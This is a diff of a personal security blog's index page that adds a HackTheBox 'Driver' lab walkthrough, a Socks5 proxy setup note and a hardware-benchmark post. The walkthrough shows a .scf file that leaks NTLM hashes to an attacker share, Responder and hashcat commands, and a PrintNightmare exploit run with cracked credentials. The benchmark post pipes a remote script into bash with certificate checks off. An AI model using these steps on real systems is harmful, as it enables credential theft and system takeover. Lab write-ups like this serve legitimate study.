@@ -160,7 +160,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -203,6 +203,244 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/12/07/HackTheBox-Driver/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+      <meta itemprop="name" content="Fre4k5en">
+      <meta itemprop="description" content="Fre4k5en's Shelter">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="最后的家">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/12/07/HackTheBox-Driver/" class="post-title-link" itemprop="url">HackTheBox-Driver</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-12-07 13:38:31" itemprop="dateCreated datePublished" datetime="2021-12-07T13:38:31+08:00">2021-12-07</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-12-09 19:23:05" itemprop="dateModified" datetime="2021-12-09T19:23:05+08:00">2021-12-09</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h4 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h4><p><img src="https://s2.loli.net/2021/12/09/PnN9TEv613QDLxH.png" alt="image-20211209160701979"></p>
+<h4 id="Find-User-Flag"><a href="#Find-User-Flag" class="headerlink" title="Find User Flag"></a>Find User Flag</h4><p>After many enumerating testing and searching, my friend told me it was <a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SMB share .scf file attacks</a> which I’ve never heard before.</p>
+<p>Shout out to my bro</p>
+<p>So let’s do it as operation in the article, use <a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">Responder</a> to listen</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./Responder.py</span> -wrf <span class="params">--lm</span> -v -I tun0</span><br></pre></td></tr></table></figure>
+
+<p>Now it’s time to create our .scf payload</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Shell]</span></span><br><span class="line"><span class="attr">Command</span>=<span class="number">2</span></span><br><span class="line"><span class="attr">IconFile</span>=\\<span class="number">192.168</span>.<span class="number">1.214</span>\share\test.ico</span><br><span class="line"><span class="section">[Taskbar]</span></span><br><span class="line"><span class="attr">Command</span>=ToggleDesktop</span><br></pre></td></tr></table></figure>
+
+<p>File name is ‘@test.scf’, add a ‘@’ in the front so it will show on the top of folder</p>
+<p>After upload this file, the current user will try to access my share area automatically and we will receive the user tony’s hash</p>
+<p><img src="https://s2.loli.net/2021/12/09/epk41iolHIbhZM5.png" alt="image-20211209184114068"></p>
+<p>Crack the hash is so quick by using</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a <span class="number">0</span> -m <span class="number">5600</span> ~<span class="regexp">/Desktop/</span><span class="number">1.</span>txt ~<span class="regexp">/SecTools/</span>SecLists/rockyou.txt --force --self-test-disable</span><br></pre></td></tr></table></figure>
+
+<p>Use <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> to get a shell</p>
+<p><img src="https://s2.loli.net/2021/12/09/3gepy12djQ4Kq8w.png" alt="image-20211209185756400"> </p>
+<p>Root Flag</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/ItWasAllADream">Itwasalladream</a> and <a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675">CVE-2021-1675</a> can do the exploitation</p>
+<p>Generate the .dll payload and start listening via MSF</p>
+<p><img src="https://s2.loli.net/2021/12/09/Mu6qvN2o9pTAXRB.png" alt="image-20211209190004241"></p>
+<p>Then upload our payload via Evil-WinRM, this step we can also establish a SMB server on our own host and upload the payload</p>
+<p>run the exp</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./CVE-2021-1675.py htb/tony:liltony@driver.htb &#x27;C:<span class="symbol">\U</span>sers<span class="symbol">\t</span>ony<span class="symbol">\D</span>ocuments<span class="symbol">\r</span>ever.dll&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2021/12/09/EqmclnCrWMRHyFZ.png" alt="image-20211209190104073"></p>
+<p>Get the system sell</p>
+<p><img src="https://s2.loli.net/2021/12/09/xUSu8E1mJhI7NXg.png" alt="image-20211209190443058"></p>
+<h4 id="Tips-amp-Summary"><a href="#Tips-amp-Summary" class="headerlink" title="Tips &amp; Summary"></a>Tips &amp; Summary</h4><p>The foothold is a rare method which needs to combine with smb server</p>
+<p>The payload generated by msfveom is better generate on host which you receive shell, otherwise there will be some ruby ERROR</p>
+<p>The sploor server will be down after you send the payload successfully</p>
+<p>Not every upload area will give you a chance to upload a reverse shell directly, you should seek carefully and learn more attack method</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/12/03/Socks5-Proxifier%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+      <meta itemprop="name" content="Fre4k5en">
+      <meta itemprop="description" content="Fre4k5en's Shelter">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="最后的家">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/12/03/Socks5-Proxifier%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86/" class="post-title-link" itemprop="url">Socks5+Proxifier搭建代理</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-12-03 11:24:08 / Modified: 12:41:19" itemprop="dateCreated datePublished" datetime="2021-12-03T11:24:08+08:00">2021-12-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h5 id="Install-serjs-go-socks5-proxy-from-Docker"><a href="#Install-serjs-go-socks5-proxy-from-Docker" class="headerlink" title="Install serjs/go-socks5-proxy from Docker"></a>Install serjs/go-socks5-proxy from Docker</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> -d --name socks5 -p 1080:1080 -e <span class="attribute">PROXY_USER</span>=&lt;PROXY_USER&gt; -e <span class="attribute">PROXY_PASSWORD</span>=&lt;PROXY_PASSWORD&gt; serjs/go-socks5-proxy</span><br></pre></td></tr></table></figure>
+
+<h5 id="Test-proxy-server-connection"><a href="#Test-proxy-server-connection" class="headerlink" title="Test proxy server connection"></a>Test proxy server connection</h5><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --socks<span class="number">5</span> <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">1080</span> https://www.baidu.com -U &lt;PROXY_USER&gt;:&lt;PROXY_PASSWORD&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Config-Proxifier"><a href="#Config-Proxifier" class="headerlink" title="Config Proxifier"></a>Config Proxifier</h5><p><img src="https://i.loli.net/2021/12/03/7klGZU89QM2WYFC.png" alt="image-20211203124010000"></p>
+<p>Then we have a stable network connection access HTB machines</p>
+<p><img src="https://i.loli.net/2021/12/03/hyIQR14teWcfJnM.png" alt="image-20211203124109015"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/11/24/Testing%20Hardware/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+      <meta itemprop="name" content="Fre4k5en">
+      <meta itemprop="description" content="Fre4k5en's Shelter">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="最后的家">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/24/Testing%20Hardware/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-11-24 18:03:01" itemprop="dateCreated datePublished" datetime="2021-11-24T18:03:01+08:00">2021-11-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Testing Hardware</p>
+<p>wget -qO- –no-check-certificate <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/oooldking/script/master/superbench.sh">https://raw.githubusercontent.com/oooldking/script/master/superbench.sh</a> | bash</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -705,228 +943,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/11/04/DVWA-Study-Notes-SQL-Injection/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/11/04/Github-Removed-Password-Authentication/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
-      <meta itemprop="name" content="Fre4k5en">
-      <meta itemprop="description" content="Fre4k5en's Shelter">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="最后的家">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/04/Github-Removed-Password-Authentication/" class="post-title-link" itemprop="url">Github Removed Password Authentication</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-11-04 16:05:03 / Modified: 17:38:33" itemprop="dateCreated datePublished" datetime="2021-11-04T16:05:03+08:00">2021-11-04</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Today when I wanna deploy some new files on my git, I found this error:</p>
-<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008i3skNgy1gtl1mnynrqj61dm0fotcd02.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtl1mnynrqj61dm0fotcd02.jpg" alt="image-20210818165525245"></a></p>
-<p>It says Git just no longer support password authentication anymore, so we need to transfer anthentication type to Token Auth or SSH Auth.</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/11/04/Github-Removed-Password-Authentication/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/11/04/HackTheBox-Academy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
-      <meta itemprop="name" content="Fre4k5en">
-      <meta itemprop="description" content="Fre4k5en's Shelter">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="最后的家">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/04/HackTheBox-Academy/" class="post-title-link" itemprop="url">HackTheBox-Academy</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-11-04 16:23:11 / Modified: 17:38:22" itemprop="dateCreated datePublished" datetime="2021-11-04T16:23:11+08:00">2021-11-04</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>利用nmap进行端口服务扫描</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sV -sC <span class="number">10.10.10.215</span></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb2137z51j30zq0iydov.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb2137z51j30zq0iydov.jpg" alt="image-20201203225102507"></a></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/11/04/HackTheBox-Academy/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/11/04/HackTheBox-Beginner-Track/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
-      <meta itemprop="name" content="Fre4k5en">
-      <meta itemprop="description" content="Fre4k5en's Shelter">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="最后的家">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/04/HackTheBox-Beginner-Track/" class="post-title-link" itemprop="url">HackTheBox-Beginner Track</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-11-04 16:13:12 / Modified: 17:38:18" itemprop="dateCreated datePublished" datetime="2021-11-04T16:13:12+08:00">2021-11-04</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="BEGINNER-TRACK"><a href="#BEGINNER-TRACK" class="headerlink" title="BEGINNER TRACK"></a>BEGINNER TRACK</h1><p>共10题</p>
-<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1go13z7cln8j30u00vhn67.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsk9od6j20u00vh767.jpg" alt="image-20210226182347964"></a></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/11/04/HackTheBox-Beginner-Track/#more" rel="contents">
                 Read more &raquo;
               </a>
             </div>
